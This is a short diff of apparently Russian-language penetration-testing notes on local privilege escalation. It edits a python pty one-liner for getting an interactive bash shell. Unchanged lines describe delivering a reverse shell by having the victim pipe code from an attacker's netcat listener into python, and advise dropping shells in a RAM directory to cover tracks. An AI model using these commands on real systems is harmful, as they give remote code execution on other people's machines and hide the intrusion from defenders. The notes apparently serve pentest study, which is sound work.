@@ -32,7 +32,7 @@ LPE
                                                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                      
-   Спавн консоли (shell python -c 'import pty;pty.spawn("/bin/bash")')                                                                                                                                                                                             
+   Спавн консоли (python -c 'import pty;pty.spawn("/bin/bash")')                                                                                                                                                                                             
     
    Есть клёвый способ доставки реверс шелла с пентест манки, (nc -lvnp 9001 < cmd) в cmd у нас код шела, на жертве (nc [ip] 9001|python)
    Путь /dev/sgm/ это RAM, так что заметёшь следы если кидаешь сюда шелы 
